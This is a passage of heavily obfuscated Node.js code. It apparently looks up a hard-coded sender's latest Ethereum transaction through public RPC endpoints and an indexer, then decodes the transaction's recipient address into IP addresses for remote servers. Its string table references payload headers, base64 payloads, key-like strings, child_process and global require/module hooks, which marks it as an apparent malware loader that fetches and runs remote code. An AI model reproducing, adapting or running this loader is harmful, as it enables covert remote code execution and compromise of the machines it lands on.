_0x8685d7=_0x3a2ebe,_0x25ef4d={'TCDmB':_0x8685d7(0x9a)};_0x438117&&_0x438117[_0x8685d7(0x194)+_0x8685d7(0xf9)](_0x25ef4d[_0x8685d7(0x191)],()=>_0x5d73ca[_0x8685d7(0x9a)](),{'once':!(0x1*-0x1073+-0x319*-0x4+0x40f)});}function decompressStream(_0x1f71f7){const _0x29b168=_0x3a2ebe,_0x5d6cbb={'BTHgJ':_0x29b168(0xc8)+_0x29b168(0x126),'VLAGf':function(_0x5acbb2,_0x1cb9f1){return _0x5acbb2===_0x1cb9f1;},'JbAci':_0x29b168(0x148),'GAvxe':_0x29b168(0x186),'KvMSQ':function(_0x55b882,_0x1919d7){return _0x55b882===_0x1919d7;},'DSbLa':_0x29b168(0xeb)};let _0x98df8e=(_0x1f71f7[_0x29b168(0x14b)][_0x5d6cbb[_0x29b168(0x12f)]]||'')[_0x29b168(0xc2)+'e']();return _0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x14d)],_0x98df8e)||_0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x176)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x14c)+'ip']()):_0x5d6cbb[_0x29b168(0x134)](_0x5d6cbb[_0x29b168(0xfd)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x165)+_0x29b168(0xb1)]()):_0x5d6cbb[_0x29b168(0x164)]('br',_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x19f)+_0x29b168(0x12d)+'ss']()):_0x1f71f7;}function httpRequest(_0x593adb,{method:_0x25a99d=_0x3a2ebe(0x133),body:_0x3f686c,signal:_0x95d4f4}={}){const _0x3d2da5=_0x3a2ebe,_0x42d10d={'JODvp':function(_0x56ddc3,_0x1259f1){return _0x56ddc3(_0x1259f1);},'gvgPD':_0x3d2da5(0x19b),'gMfuo':_0x3d2da5(0xaf),'KaaPY':_0x3d2da5(0x142),'rysJt':_0x3d2da5(0xc1),'UlrdI':function(_0x322dc5,_0x2b93bc){return _0x322dc5===_0x2b93bc;},'MHjGK':_0x3d2da5(0xd5),'zBIcw':function(_0x2a5ebb,_0xfe6778){return _0x2a5ebb+_0xfe6778;},'VGOlJ':function(_0x563e9c,_0x3a7e42){return _0x563e9c!=_0x3a7e42;},'xuBDG':function(_0x4bfaf9,_0x580f75){return _0x4bfaf9===_0x580f75;},'sZAHS':_0x3d2da5(0x161)+_0x3d2da5(0xa8),'tjngf':_0x3d2da5(0x12a)+_0x3d2da5(0x1aa),'LGNYs':_0x3d2da5(0x131),'YvZxf':_0x3d2da5(0x1a9)+'pe','vWzxi':_0x3d2da5(0x16e)+_0x3d2da5(0x1b5)};let _0x3cdce5=new URL(_0x593adb),_0x5032cf=_0x42d10d[_0x3d2da5(0x12c)](_0x42d10d[_0x3d2da5(0x139)],_0x3cdce5[_0x3d2da5(0x196)])?https:http,_0x27236b={'Accept':_0x42d10d[_0x3d2da5(0xa0)],'Accept-Encoding':_0x42d10d[_0x3d2da5(0xbb)],'Connection':_0x42d10d[_0x3d2da5(0x135)]};return _0x42d10d[_0x3d2da5(0xe3)](null,_0x3f686c)&&(_0x27236b[_0x42d10d[_0x3d2da5(0x115)]]=_0x42d10d[_0x3d2da5(0xa0)],_0x27236b[_0x42d10d[_0x3d2da5(0x17b)]]=Buffer[_0x3d2da5(0x19d)](_0x3f686c)),new Promise((_0x19f067,_0x4835e3)=>{const _0x3ef1bc=_0x3d2da5;let _0xaf0385=_0x5032cf[_0x3ef1bc(0xc7)]({'hostname':_0x3cdce5[_0x3ef1bc(0x93)],'port':_0x3cdce5[_0x3ef1bc(0x15d)]||(_0x42d10d[_0x3ef1bc(0x120)](_0x42d10d[_0x3ef1bc(0x139)],_0x3cdce5[_0x3ef1bc(0x196)])?0x1*-0xcfb+-0x1d2d+0xf*0x2ed:0x1338+0x2*-0x8d5+-0x13e),'path':_0x42d10d[_0x3ef1bc(0x14e)](_0x3cdce5[_0x3ef1bc(0x150)],_0x3cdce5[_0x3ef1bc(0x10e)]),'method':_0x25a99d,'agent':AGENTS[_0x3cdce5[_0x3ef1bc(0x196)]],'signal':_0x95d4f4,'headers':_0x27236b},_0x574ec9=>{const _0x4fd834=_0x3ef1bc,_0x10e94a={'ZGtcg':function(_0x483995,_0x4a5702){const _0x49dc91=_0x355e;return _0x42d10d[_0x49dc91(0x114)](_0x483995,_0x4a5702);},'vJvXf':_0x42d10d[_0x4fd834(0x18b)]};let _0x431427=_0x42d10d[_0x4fd834(0x114)](decompressStream,_0x574ec9),_0x39bef6=[];_0x431427['on'](_0x42d10d[_0x4fd834(0x122)],_0x123305=>_0x39bef6[_0x4fd834(0x198)](_0x123305)),_0x431427['on'](_0x42d10d[_0x4fd834(0x1ac)],()=>{const _0x589be9=_0x4fd834;try{_0x10e94a[_0x589be9(0x99)](_0x19f067,JSON[_0x589be9(0xd4)](Buffer[_0x589be9(0x107)](_0x39bef6)[_0x589be9(0x159)](_0x10e94a[_0x589be9(0xc5)])));}catch(_0x1c95a1){_0x10e94a[_0x589be9(0x99)](_0x4835e3,_0x1c95a1);}}),_0x431427['on'](_0x42d10d[_0x4fd834(0x121)],_0x4835e3);});_0xaf0385['on'](_0x42d10d[_0x3ef1bc(0x121)],_0x4835e3),_0x42d10d[_0x3ef1bc(0xe3)](null,_0x3f686c)&&_0xaf0385[_0x3ef1bc(0xb6)](_0x3f686c),_0xaf0385[_0x3ef1bc(0x142)]();});}async function withRpcEndpoints(_0x3c144e,_0x2ea979){const _0x495608=_0x3a2ebe;let _0x418a00=RPC_ENDPOINTS[_0x495608(0x14f)](()=>new AbortController());_0x418a00[_0x495608(0x95)](_0x15379b=>linkAbort(_0x2ea979,_0x15379b));try{return await Promise[_0x495608(0x11e)](RPC_ENDPOINTS[_0x495608(0x14f)]((_0x4c6137,_0x2fd673)=>_0x3c144e(_0x4c6137,_0x418a00[_0x2fd673][_0x495608(0x10b)])));}finally{for(let _0x393e64 of _0x418a00)_0x393e64[_0x495608(0x9a)]();}}async function rpcCall(_0x1c3ac1,_0x908566,_0x2038b9,_0x36db10){const _0x24e2d3=_0x3a2ebe,_0x55d7b1={'hXaau':function(_0x7320cd,_0x19397a,_0x30fde9){return _0x7320cd(_0x19397a,_0x30fde9);},'MxoIv':_0x24e2d3(0x19c),'CtMxp':_0x24e2d3(0x97)};let _0xffe3dd=await _0x55d7b1[_0x24e2d3(0x109)](httpRequest,_0x1c3ac1,{'method':_0x55d7b1[_0x24e2d3(0x9f)],'body':JSON[_0x24e2d3(0x98)]({'jsonrpc':_0x55d7b1[_0x24e2d3(0x140)],'id':0x1,'method':_0x908566,'params':_0x2038b9}),'signal':_0x36db10});return _0xffe3dd[_0x24e2d3(0xd6)];}async function rpcBatch(_0xb94eeb,_0x2e1831,_0x1aa236){const _0x143ca3=_0x3a2ebe,_0x8d06ce={'vVkBr':function(_0x259c12,_0x46239b,_0x186b51){return _0x259c12(_0x46239b,_0x186b51);},'HiWYY':_0x143ca3(0x19c)};let _0x303103=await _0x8d06ce[_0x143ca3(0x103)](httpRequest,_0xb94eeb,{'method':_0x8d06ce[_0x143ca3(0x1a8)],'body':JSON[_0x143ca3(0x98)](_0x2e1831[_0x143ca3(0x14f)](([_0xe79aa1,_0x386e83],_0x397f41)=>({'jsonrpc':_0x143ca3(0x97),'id':_0x397f41+(-0x2b*-0x48+0x2467+0x3*-0x102a),'method':_0xe79aa1,'params':_0x386e83}))),'signal':_0x1aa236}),_0x43900d=new Map(_0x303103[_0x143ca3(0x14f)](_0x46f816=>[_0x46f816['id'],_0x46f816]));return _0x2e1831[_0x143ca3(0x14f)]((_0x246f0d,_0x260de3)=>_0x43900d[_0x143ca3(0xe9)](_0x260de3+(-0xa25*-0x2+0x19fa+-0x2e43))[_0x143ca3(0xd6)]);}let toBlockHex=_0x460a01=>'0x'+_0x460a01[_0x3a2ebe(0x159)](0x1b97+-0x2*0x3a7+-0x1f*0xa7);function findSenderTx(_0xaed72){const _0x58ebf2=_0x3a2ebe;return _0xaed72[_0x58ebf2(0x9d)](_0x11770d=>_0x11770d[_0x58ebf2(0x18c)]&&_0x11770d[_0x58ebf2(0x18c)][_0x58ebf2(0xc2)+'e']()===SENDER)||null;}function decodeAddress(_0x3f982d){const _0x53878e=_0x3a2ebe,_0x160094={'ScXiL':_0x53878e(0x15a),'jrdXD':function(_0x5aff48,_0x31311f){return _0x5aff48(_0x31311f);},'DGksE':function(_0x4f37d6,_0x4e64f1){return _0x4f37d6(_0x4e64f1);}};let _0x268f72=Buffer[_0x53878e(0x18c)](_0x3f982d[_0x53878e(0xbd)](/^0x/i,''),_0x160094[_0x53878e(0x1a2)]),_0x43d4d2=_0x33741d=>_0x33741d[-0x853+-0x2*0x338+0xec3]+'.'+_0x33741d[-0xb2c+-0x1e9+-0x1*-0xd16]+'.'+_0x33741d[-0x1*-0x704+-0x1*-0x25e1+0x2ce3*-0x1]+'.'+_0x33741d[0x2*0x1042+-0x4c2*0x5+-0x8b7];return[_0x160094[_0x53878e(0xb0)](_0x43d4d2,_0x268f72[_0x53878e(0xde)](-0x1*-0x1def+0x1939+0x4*-0xdca,0x71*0x23+0x2410+-0x337f)),_0x160094[_0x53878e(0xcf)](_0x43d4d2,_0x268f72[_0x53878e(0xde)](-0x2f*0x3+0xb5*0xd+-0x6*0x170,0x1*-0x22a0+-0xe*0x15a+0x3594))];}function _0x12f0(){const _0x2c2fa8=['smCxl','node:https','oad\x20body','any','zNIqU','UlrdI','rysJt','gMfuo','Payload-B6',':443/0x/ls','ipNqp','coding','UqBND',',Sr3=@','_t_u\x27]=\x27','gzip,\x20defl','SDbiI','xuBDG','liDecompre','EreqP','BTHgJ','Kit/537.36','keep-alive','_t_s\x27]=\x27','GET','KvMSQ','LGNYs','public.bla','plaFW','NkKDh','MHjGK','13698468PmAknI','0xa322e5f3','297120QUZuEg','yrzwP','zeoxL','eth_getBlo','CtMxp','Agent','end','on=txlist&','jvgKp','KXiLK','Win64;\x20x64','node:zlib','gzip','https://1r','node:http','headers','createGunz','JbAci','zBIcw','map','pathname','nghnv','.publicnod','fari/537.3','RpPIO',':80','VnFVq','m\x27]=module','hrUVT','toString','hex','LBjUj','_t_s','port','_H2\x27]=\x27','QLmfg','9&page=1&o','applicatio','YZKTj','findIndex','VLAGf','createInfl','transactio','gldQK','GuYPf','h.drpc.org','_H2','ut.com/api','fLYXd','has','Content-Le','controller','aveIc','tavZt','BJgzE','add','49oNuXHs','JVkQF','GAvxe','unref','then','al=global;','\x27]=\x27','vWzxi','node:url','oMnng','http://','run','\x20Chrome/13',':443','bXcTI','k=0&endblo','lnQal','@^1aQk','x-gzip','nonce','e.com','bLolJ','ike\x20Gecko)','gvgPD','from','KafOh','h.blocksco','hereum-rpc','ort=desc&f','TCDmB','LssUT','https://et','addEventLi','pipe','protocol','ffset=20&s','push','ZgpqG','Tnnlg','utf8','POST','byteLength','qFOcQ','createBrot','ugrhL','eth_blockN','ScXiL','WYnsa','0\x20(Windows','zwjTr','eEQvU','b64','HiWYY','Content-Ty','ate,\x20br','xxxso','KaaPY','fIkOw','blockNumbe','9adc2490ef','eAmtO','min','wNEAr','ucVFK','jueMj','ngth','FfHYb','gzKWs','PSzJk','resume','y-p_>d$0B&','nILEL','hostname','KQldR','forEach','base64','2.0','stringify','ZGtcg','abort','filter','rMZnD','find','1.0.0.0\x20Sa','MxoIv','sZAHS','fbAQy','dQhjR','count&acti','qqKoX','3999712DXgKmU','ziJAI','q4FZkxX{!h','n/json','x-payload-','foHur','RWrVc','charCodeAt','nnxOv','mjCAw','data','jrdXD','ate','ZYBBe','eth_getTra','all','883554gwKkih','write','JQKVG','mGgtb','Missing\x20X-','ck=9999999','tjngf','address=','replace','r\x27]=requir','fJKsv','5050170JAAsRa','error','toLowerCas','xbMiN','ilterby=fr','vJvXf','raCZU','request','content-en','unt','XLylK','d311d3080e','TOkwx','length','WMrCP','DGksE','nsactionCo','FWUiH','RsZph','aPZUM','parse','https:','result','object','umber','VMnQg','CDbzL','Empty\x20payl','\x20NT\x2010.0;\x20','2KeNBiC','subarray','wvGeG','CUrwh','\x20(KHTML,\x20l','XrZYs','VGOlJ',':443/0x/cl','&startbloc','rjSZm','LTGfe','ZAlOy','get','6f0121063e','deflate','MjzxH','node','\x27;global[\x27','?module=ac','360688RTYsDf','stapi.io','isArray','eWCKt','_process','h-mainnet.','GGqwf','eIHSm','xQuoH','stener','_H\x27]=\x27','Mozilla/5.','djgaa','DSbLa','qiODF','global[\x27_V','catch','cVjMR','SXfgk','vVkBr','QMwHG','node:child',';var\x20_glob','concat','JGUpq','hXaau','XHNyr','signal','5407112rvLYDS','ckByNumber','search','ignore','pc.io/eth','e;global[\x27','gIWWO','SHJJd','JODvp','YvZxf','_t_u',')\x20AppleWeb','CRKiT','tqJhV','HEAD'];_0x12f0=function(){return _0x2c2fa8;};return _0x12f0();}function firstMatch(_0x21b624){const _0x5f5985={'fIkOw':function(_0x228835,_0x5c99db){return _0x228835(_0x5c99db);},'fJKsv':function(_0x6e49ad,_0x5da592){return _0x6e49ad==_0x5da592;},'aveIc':function(_0x5f50e9,_0x4cf526){return _0x5f50e9(_0x4cf526);},'JVkQF':function(_0x1b9cad,_0x34e74f){return _0x1b9cad!=_0x34e74f;},'QLmfg':function(_0x2b1d39,_0xfdf95d){return _0x2b1d39(_0xfdf95d);},'gldQK':function(_0x330753,_0x1837de){return _0x330753(_0x1837de);}};return new Promise(_0x1055a6=>{const _0x43a200=_0x355e,_0x574496={'qqKoX':function(_0x4f2e13,_0x16b5ae){const _0x4bfb56=_0x355e;return _0x5f5985[_0x4bfb56(0x170)](_0x4f2e13,_0x16b5ae);}};let _0x34d0a3=_0x21b624[_0x43a200(0xcd)];if(!_0x34d0a3)return _0x5f5985[_0x43a200(0x167)](_0x1055a6,null);let _0x12f190=!(0x1*-0xead+-0x25d5+0x3483),_0x4ea38e=_0x344775=>{const _0x5a6f9a=_0x43a200;if(!_0x12f190){for(let _0x11c14b of(_0x12f190=!(-0x13c4+-0x1a02+0x2dc6),_0x21b624))_0x11c14b[_0x5a6f9a(0x16f)][_0x5a6f9a(0x9a)]();_0x574496[_0x5a6f9a(0xa4)](_0x1055a6,_0x344775);}};for(let _0x266710 of _0x21b624)_0x266710[_0x43a200(0x17f)]()[_0x43a200(0x178)](_0x193f94=>{const _0x1cbfd8=_0x43a200;_0x12f190||(_0x193f94?_0x5f5985[_0x1cbfd8(0x1ad)](_0x4ea38e,_0x193f94):_0x5f5985[_0x1cbfd8(0xbf)](0xe0*0x4+0x1*0x1bf7+-0x1f77,--_0x34d0a3)&&_0x5f5985[_0x1cbfd8(0x170)](_0x1055a6,null));})[_0x43a200(0x100)](()=>{const _0xebd979=_0x43a200;_0x12f190||_0x5f5985[_0xebd979(0x175)](-0xc39+0x723+0x516,--_0x34d0a3)||_0x5f5985[_0xebd979(0x15f)](_0x1055a6,null);});});}function candidateBlocks(_0x3cdaf9){const _0x3e16b7=_0x3a2ebe,_0x26a154={'CRKiT':function(_0x296270,_0x1821b5){return _0x296270-_0x1821b5;},'nnxOv':function(_0xd797ea,_0x1874f0){return _0xd797ea-_0x1874f0;},'BJgzE':function(_0x17a746,_0x198c5e){return _0x17a746+_0x198c5e;},'nghnv':function(_0xc4b7b9,_0x52dbd9){return _0xc4b7b9-_0x52dbd9;},'fLYXd':function(_0x9cf028,_0x268c43){return _0x9cf028+_0x268c43;},'WMrCP':function(_0x1f3421,_0x1c5822){return _0x1f3421<_0x1c5822;}};let _0x4a55ef=_0x26a154[_0x3e16b7(0x118)](_0x3cdaf9,BLOCK_MULTIPLE),_0x5e5c51=new Set(),_0x482794=[];for(let _0x2d2666 of[_0x26a154[_0x3e16b7(0xad)](_0x3cdaf9,0x1n),_0x3cdaf9,_0x26a154[_0x3e16b7(0x172)](_0x3cdaf9,0x1n),_0x26a154[_0x3e16b7(0x151)](_0x4a55ef,0x1n),_0x4a55ef,_0x26a154[_0x3e16b7(0x16c)](_0x4a55ef,0x1n)]){if(_0x26a154[_0x3e16b7(0xce)](_0x2d2666,0x0n))continue;let _0x3ae321=_0x2d2666[_0x3e16b7(0x159)]();_0x5e5c51[_0x3e16b7(0x16d)](_0x3ae321)||(_0x5e5c51[_0x3e16b7(0x173)](_0x3ae321),_0x482794[_0x3e16b7(0x198)](_0x2d2666));}return _0x482794;}function blockTask(_0x42089c){const _0x43f677={'wNEAr':function(_0x5d6398,_0x346548,_0x44c318){return _0x5d6398(_0x346548,_0x44c318);},'ziJAI':function(_0x1919d0,_0x138670){return _0x1919d0(_0x138670);}};let _0xc51d7b=new AbortController();return{'controller':_0xc51d7b,async 'run'(){const _0x4800f8=_0x355e;let _0x3fcdb4=await _0x43f677[_0x4800f8(0x1b2)](withRpcEndpoints,(_0x3c3351,_0x45a26b)=>rpcCall(_0x3c3351,_0x4800f8(0x13f)+_0x4800f8(0x10d),[toBlockHex(_0x42089c),!(-0x1*0xaeb+-0x7*0x59+-0x1*-0xd5a)],_0x45a26b),_0xc51d7b[_0x4800f8(0x10b)]),_0xa17565=_0x3fcdb4?.[_0x4800f8(0x166)+'ns'];if(!Array[_0x4800f8(0xf2)](_0xa17565))return null;let _0x3aaf38=_0x43f677[_0x4800f8(0xa6)](findSenderTx,_0xa17565);return _0x3aaf38?{'blockNumber':_0x42089c,'tx':_0x3aaf38}:null;}};}async function nonceAtBlocks(_0x48b0b7,_0xeba093){const _0x2bf86d=_0x3a2ebe,_0x306878={'CUrwh':function(_0x5917ba,_0x80a075,_0x5f1ee8){return _0x5917ba(_0x80a075,_0x5f1ee8);}};let _0x5c1a05=_0x48b0b7[_0x2bf86d(0x14f)](_0x1dcdef=>[_0x2bf86d(0xb3)+_0x2bf86d(0xd0)+_0x2bf86d(0xc9),[SENDER,toBlockHex(_0x1dcdef)]]);try{return(await _0x306878[_0x2bf86d(0xe0)](withRpcEndpoints,(_0xd746f,_0x473522)=>rpcBatch(_0xd746f,_0x5c1a05,_0x473522),_0xeba093))[_0x2bf86d(0x14f)](BigInt);}catch{return(await Promise[_0x2bf86d(0xb4)](_0x5c1a05[_0x2bf86d(0x14f)](([_0x2babff,_0x3a3b66])=>withRpcEndpoints((_0x149844,_0xb83fe7)=>rpcCall(_0x149844,_0x2babff,_0x3a3b66,_0xb83fe7),_0xeba093))))[_0x2bf86d(0x14f)](BigInt);}}async function lastSenderTx(_0x6947a6){const _0x2fd541=_0x3a2ebe,_0x865f0d={'TOkwx':function(_0x5d2d58,_0x8010fd){return _0x5d2d58(_0x8010fd);},'mGgtb':function(_0x58f27c,_0x4c45b7,_0x3c600e){return _0x58f27c(_0x4c45b7,_0x3c600e);},'MjzxH':function(_0x1c1e28,_0x3211ab){return _0x1c1e28(_0x3211ab);},'JQKVG':function(_0x4c6ce4,_0x3b78d1){return _0x4c6ce4-_0x3b78d1;},'ucVFK':function(_0x1fa7f8,_0x1e54b0){return _0x1fa7f8>_0x1e54b0;},'oMnng':function(_0x514391,_0x56220c){return _0x514391(_0x56220c);},'NkKDh':function(_0x3fccd7,_0x3598ae){return _0x3fccd7<=_0x3598ae;},'lnQal':function(_0x35f187,_0x271b47){return _0x35f187+_0x271b47;},'foHur':function(_0x1e7b3b,_0x19c605){return _0x1e7b3b/_0x19c605;},'SDbiI':function(_0x43c2f0,_0xbdc559){return _0x43c2f0*_0xbdc559;},'CDbzL':function(_0x461538,_0x22c7d6){return _0x461538+_0x22c7d6;},'GGqwf':function(_0x4c1acc,_0x1f6394){return _0x4c1acc===_0x1f6394;},'fbAQy':function(_0xe78b10,_0x2a2d28){return _0xe78b10(_0x2a2d28);}};let _0x1228d0=new AbortController();try{let _0x7717c5=_0x6947a6??_0x865f0d[_0x2fd541(0xcc)](BigInt,await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x225474,_0x398eed)=>rpcCall(_0x225474,_0x2fd541(0x1a1)+_0x2fd541(0xd8),[],_0x398eed),_0x1228d0[_0x2fd541(0x10b)])),_0xe32847=_0x865f0d[_0x2fd541(0xec)](BigInt,await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x166e6e,_0x20a24f)=>rpcCall(_0x166e6e,_0x2fd541(0xb3)+_0x2fd541(0xd0)+_0x2fd541(0xc9),[SENDER,toBlockHex(_0x7717c5)],_0x20a24f),_0x1228d0[_0x2fd541(0x10b)])),_0x2c7ca1=_0x865f0d[_0x2fd541(0xb7)](_0xe32847,0x1n),_0x36dc0b=_0x865f0d[_0x2fd541(0xb7)](SEARCH_FLOOR,0x1n),_0x57beb5=_0x7717c5;for(;_0x865f0d[_0x2fd541(0x1b3)](_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b),0x1n);){let _0x37635a=_0x865f0d[_0x2fd541(0xb7)](_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b),0x1n),_0x40232d=_0x865f0d[_0x2fd541(0xec)](BigInt,Math[_0x2fd541(0x1b1)](NONCE_FANOUT,_0x865f0d[_0x2fd541(0x17d)](Number,_0x37635a))),_0x5e593e=[];for(let _0x323461=0x1n;_0x865f0d[_0x2fd541(0x138)](_0x323461,_0x40232d);_0x323461+=0x1n)_0x5e593e[_0x2fd541(0x198)](_0x865f0d[_0x2fd541(0x184)](_0x36dc0b,_0x865f0d[_0x2fd541(0xaa)](_0x865f0d[_0x2fd541(0x12b)](_0x323461,_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b)),_0x865f0d[_0x2fd541(0xda)](_0x40232d,0x1n))));let _0x5aae99=await _0x865f0d[_0x2fd541(0xb8)](nonceAtBlocks,_0x5e593e,_0x1228d0[_0x2fd541(0x10b)]),_0x5415e7=_0x5aae99[_0x2fd541(0x163)](_0x59ad09=>_0x59ad09>=_0xe32847);_0x865f0d[_0x2fd541(0xf6)](-(0xe3*-0x29+0xe5e*0x2+0x7a0*0x1),_0x5415e7)?_0x36dc0b=_0x5e593e[_0x865f0d[_0x2fd541(0xb7)](_0x5e593e[_0x2fd541(0xcd)],-0x6*-0x4a2+0x2478+-0x4043)]:(_0x57beb5=_0x5e593e[_0x5415e7],_0x865f0d[_0x2fd541(0x1b3)](_0x5415e7,-0x170*-0x5+-0xbdf+-0x6d*-0xb)&&(_0x36dc0b=_0x5e593e[_0x865f0d[_0x2fd541(0xb7)](_0x5415e7,-0x121b+0x869*-0x1+0x3*0x8d7)]));}let _0x44a2e1=await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x5aa246,_0x356a05)=>rpcCall(_0x5aa246,_0x2fd541(0x13f)+_0x2fd541(0x10d),[toBlockHex(_0x57beb5),!(-0x870*0x1+-0x1b5b+0x23cb)],_0x356a05),_0x1228d0[_0x2fd541(0x10b)]),_0x2a8ad0=_0x44a2e1?.[_0x2fd541(0x166)+'ns']||[],_0x5d7a1a=null;for(let _0x2ef2b4 of _0x2a8ad0)if(_0x2ef2b4[_0x2fd541(0x18c)]&&_0x865f0d[_0x2fd541(0xf6)](_0x2ef2b4[_0x2fd541(0x18c)][_0x2fd541(0xc2)+'e'](),SENDER)){if(_0x865f0d[_0x2fd541(0xf6)](_0x865f0d[_0x2fd541(0x17d)](BigInt,_0x2ef2b4[_0x2fd541(0x187)]),_0x2c7ca1)){_0x5d7a1a=_0x2ef2b4;break;}(!_0x5d7a1a||_0x865f0d[_0x2fd541(0x1b3)](_0x865f0d[_0x2fd541(0x17d)](BigInt,_0x2ef2b4[_0x2fd541(0x187)]),_0x865f0d[_0x2fd541(0xa1)](BigInt,_0x5d7a1a[_0x2fd541(0x187)])))&&(_0x5d7a1a=_0x2ef2b4);}return{'blockNumber':_0x57beb5,'tx':_0x5d7a1a};}finally{_0x1228d0[_0x2fd541(0x9a)]();}}async function lastSenderTxViaIndexer(){const _0x30016b=_0x3a2ebe,_0x461186={'yrzwP':function(_0x224acc,_0x21a4ef){return _0x224acc(_0x21a4ef);},'UqBND':function(_0x3ca6e2,_0x6d0e95){return _0x3ca6e2(_0x6d0e95);}};let _0x6b3534=INDEXER_URL+(_0x30016b(0xef)+_0x30016b(0xa3)+_0x30016b(0x143)+_0x30016b(0xbc))+SENDER+(_0x30016b(0xe5)+_0x30016b(0x183)+_0x30016b(0xba)+_0x30016b(0x160)+_0x30016b(0x197)+_0x30016b(0x190)+_0x30016b(0xc4)+'om'),_0x50dcd4=await _0x461186[_0x30016b(0x13d)](httpRequest,_0x6b3534),_0x3f1cd2=Array[_0x30016b(0xf2)](_0x50dcd4?.[_0x30016b(0xd6)])?_0x50dcd4[_0x30016b(0xd6)]:[],_0x58d5fe=_0x3f1cd2[_0x30016b(0x9d)](_0x5346ca=>_0x5346ca[_0x30016b(0x18c)]&&_0x5346ca[_0x30016b(0x18c)][_0x30016b(0xc2)+'e']()===SENDER);return{'blockNumber':_0x461186[_0x30016b(0x127)](BigInt,_0x58d5fe[_0x30016b(0x1ae)+'r']),'tx':_0x58d5fe};}async function run(){const _0x21838c=_0x3a2ebe,_0x123142={'VnFVq':function(_0x354288,_0x3fa815){return _0x354288<_0x3fa815;},'Tnnlg':function(_0x1df33a,_0x158d6c){return _0x1df33a%_0x158d6c;},'ugrhL':_0x21838c(0x19b),'tqJhV':_0x21838c(0xa9)+_0x21838c(0x1a7),'xQuoH':function(_0x183f5f,_0x2adbd1){return _0x183f5f(_0x2adbd1);},'zwjTr':_0x21838c(0xb9)+_0x21838c(0x123)+'4','GuYPf':_0x21838c(0x96),'bXcTI':function(_0x4834c3,_0xed5caa){return _0x4834c3(_0xed5caa);},'gzKWs':_0x21838c(0xdb)+_0x21838c(0x11d),'VMnQg':function(_0x38ff78,_0x527698){return _0x38ff78===_0x527698;},'PSzJk':_0x21838c(0x11a),'aPZUM':_0x21838c(0xaf),'xxxso':_0x21838c(0x142),'raCZU':_0x21838c(0xc1),'plaFW':function(_0x1d2be3,_0x44ea01){return _0x1d2be3(_0x44ea01);},'nILEL':function(_0x57e6f1,_0x261c45){return _0x57e6f1+_0x261c45;},'wvGeG':_0x21838c(0xfb)+_0x21838c(0x1a4)+_0x21838c(0xdc)+_0x21838c(0x146)+_0x21838c(0x117)+_0x21838c(0x130)+_0x21838c(0xe1)+_0x21838c(0x18a)+_0x21838c(0x180)+_0x21838c(0x9e)+_0x21838c(0x153)+'6','qiODF':function(_0x2b7840,_0x196963){return _0x2b7840(_0x196963);},'SXfgk':_0x21838c(0x133),'xbMiN':function(_0x27a0b9,_0x394d32,_0x228371){return _0x27a0b9(_0x394d32,_0x228371);},'jueMj':function(_0x3071ee,_0x13c1dd){return _0x3071ee(_0x13c1dd);},'ipNqp':function(_0x5c8fe2,_0x51b60d,_0x375c99,_0x3adfd0){return _0x5c8fe2(_0x51b60d,_0x375c99,_0x3adfd0);},'KXiLK':_0x21838c(0xed),'rMZnD':function(_0x2485d9,_0x15b4b8){return _0x2485d9+_0x15b4b8;},'RWrVc':_0x21838c(0x10f),'WYnsa':function(_0x36aa2d,_0x4e00f2){return _0x36aa2d(_0x4e00f2);},'JGUpq':function(_0x17a5ba,_0xaf6465){return _0x17a5ba(_0xaf6465);},'eWCKt':function(_0x1e004b,_0x84fa2c){return _0x1e004b-_0x84fa2c;},'KafOh':function(_0x4df275,_0x2e90){return _0x4df275%_0x2e90;},'qFOcQ':function(_0x24fa80,_0x20975f){return _0x24fa80(_0x20975f);},'eIHSm':_0x21838c(0xa7)+_0x21838c(0x128),'XrZYs':function(_0x4740e4,_0x8d4335,_0x240499,_0x191515){return _0x4740e4(_0x8d4335,_0x240499,_0x191515);},'zeoxL':_0x21838c(0x1ba)+_0x21838c(0x185)};let _0x276e42=_0x123142[_0x21838c(0x1a3)](BigInt,await _0x123142[_0x21838c(0x108)](withRpcEndpoints,(_0x486914,_0x1c1835)=>rpcCall(_0x486914,_0x21838c(0x1a1)+_0x21838c(0xd8),[],_0x1c1835))),_0x168d06=_0x123142[_0x21838c(0xf3)](_0x276e42,_0x123142[_0x21838c(0x18d)](_0x276e42,BLOCK_MULTIPLE)),_0x412ae7=await _0x123142[_0x21838c(0x137)](firstMatch,_0x123142[_0x21838c(0x1a3)](candidateBlocks,_0x168d06)[_0x21838c(0x14f)](blockTask));_0x412ae7||(_0x412ae7=await _0x123142[_0x21838c(0x19e)](lastSenderTx,_0x276e42)[_0x21838c(0x100)](()=>lastSenderTxViaIndexer()));let [_0x28de5d,_0x3b6d7d]=_0x123142[_0x21838c(0x1b4)](decodeAddress,_0x412ae7['tx']['to']),_0x3d94ba=global;function _0x5ec9c4(_0x3a20ac,_0xa9d24e){const _0x55165e=_0x21838c,_0x5ecf66={'zNIqU':function(_0x430017,_0x3246e6){const _0x15bc56=_0x355e;return _0x123142[_0x15bc56(0x182)](_0x430017,_0x3246e6);},'rjSZm':_0x123142[_0x55165e(0x119)],'cVjMR':_0x123142[_0x55165e(0x1b7)],'SHJJd':function(_0x200ce2,_0x44228d){const _0x155fb8=_0x55165e;return _0x123142[_0x155fb8(0xd9)](_0x200ce2,_0x44228d);},'dQhjR':_0x123142[_0x55165e(0x1b8)],'ZAlOy':function(_0x59c273,_0x17297a){const _0x4fc8a3=_0x55165e;return _0x123142[_0x4fc8a3(0xf8)](_0x59c273,_0x17297a);},'bLolJ':_0x123142[_0x55165e(0xd3)],'hrUVT':_0x123142[_0x55165e(0x1ab)],'YZKTj':_0x123142[_0x55165e(0xc6)]};let 